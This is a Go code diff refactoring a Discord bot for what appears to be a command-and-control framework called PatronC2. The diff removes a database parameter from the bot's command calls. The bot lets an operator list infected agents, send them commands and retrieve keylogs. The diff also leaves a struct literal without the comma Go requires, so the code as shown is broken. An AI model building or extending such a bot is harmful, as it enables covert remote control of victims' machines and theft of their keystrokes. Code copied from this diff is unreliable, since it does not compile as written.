@@ -9,7 +9,7 @@ import (
 	"strings"
 
 	"github.com/PatronC2/Patron/bot/command"
-	"github.com/PatronC2/Patron/data"
+	"github.com/PatronC2/Patron/api/api"
 	"github.com/bwmarrin/discordgo"
 	"github.com/joho/godotenv"
 	"github.com/s-christian/gollehs/lib/logger"
@@ -18,7 +18,6 @@ import (
 // Bot structure holds the Discord session and database connection
 type Bot struct {
 	Session *discordgo.Session
-	DB      *sql.DB
 }
 
 // add this to an helper function
@@ -44,11 +43,11 @@ func (bot *Bot) newMsg(session *discordgo.Session, message *discordgo.MessageCre
 		session.ChannelMessageSend(message.ChannelID, "Use `!agents` to list agents\nUse `!refresh <uuid>` to get agent commands/refresh\nUse `!cmd <uuid> ^command^` to issue commands to the agent\nUse `!keys <uuid>` to get keylogs")
 	case strings.Contains(message.Content, "!refresh"):
 		logger.Logf(logger.Info, "Bot received !refresh triggered :"+message.Content+"\n")
-		agentBot := command.GetBotAgent(bot.DB, message.Content)
+		agentBot := command.GetBotAgent(message.Content)
 		session.ChannelMessageSendComplex(message.ChannelID, agentBot)
 	case strings.Contains(message.Content, "!agents"):
 		logger.Logf(logger.Info, "Bot received !agents triggered :"+message.Content+"\n")
-		agentsBot := command.GetBotAgents(bot.DB)
+		agentsBot := command.GetBotAgents()
 		_ ,err := session.ChannelMessageSendComplex(message.ChannelID, agentsBot)
 		if err != nil {
 			log.Println("Error sending message:", err)
@@ -58,11 +57,11 @@ func (bot *Bot) newMsg(session *discordgo.Session, message *discordgo.MessageCre
 		logger.Logf(logger.Info, "Bot sent !agents response"+"\n")
 	case strings.Contains(message.Content, "!keys"):
 		logger.Logf(logger.Info, "Bot received !keys triggered :"+message.Content+"\n")
-		agentsBot := command.GetBotKeys(bot.DB, message.Content)
+		agentsBot := command.GetBotKeys(message.Content)
 		session.ChannelMessageSendComplex(message.ChannelID, agentsBot)
 	case strings.Contains(message.Content, "!cmd"):
 		logger.Logf(logger.Info, "Bot received !cmd triggered :"+message.Content+"\n")
-		agentsBot := command.PostBotCmd(bot.DB, message.Content)
+		agentsBot := command.PostBotCmd(message.Content)
 		session.ChannelMessageSendComplex(message.ChannelID, agentsBot)
 	// case strings.Contains(message.Content, "!cmd"):
 	// 	session.ChannelMessageSend(message.ChannelID, "piss off")
@@ -79,8 +78,7 @@ func (bot *Bot) newMsg(session *discordgo.Session, message *discordgo.MessageCre
 
 func main() {
 	// open database
-	db  := data.OpenDatabase()
-	defer db.Close()
+	api.OpenDatabase()
 	botToken := goDotEnvVariable("BOT_TOKEN")
 	// create session
 	logger.Logf(logger.Info, "Discord Bot Started\n")
@@ -91,8 +89,7 @@ func main() {
 
 	// Create an instance of the Bot structure
 	bot := Bot{
-		Session: discord,
-		DB:      db,
+		Session: discord
 	}
 
 	// Add event handler
